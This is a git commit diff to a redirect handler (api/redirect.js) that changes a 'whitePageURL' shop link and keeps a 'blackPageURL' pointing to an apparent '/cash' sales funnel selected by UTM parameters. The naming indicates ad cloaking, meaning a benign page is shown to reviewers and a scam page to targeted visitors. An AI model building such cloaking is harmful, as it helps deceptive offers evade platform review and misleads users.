680c4d9cbcf3765953f702118aad13edcab8324d
rmeeesumraza <github@snobay.com>
2024-12-25 19:54:01 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.famcapstore.com/products/9forty-frame-mlb-atlanta-braves";
+    const whitePageURL = "https://angelicmotion.com/products/onyx-zipup?variant=40022097330310";
     const blackPageURL = "https://blacksocksimbassd.myfunnelish.com/cash";
   
     // Parse the UTM parameters from the request URL
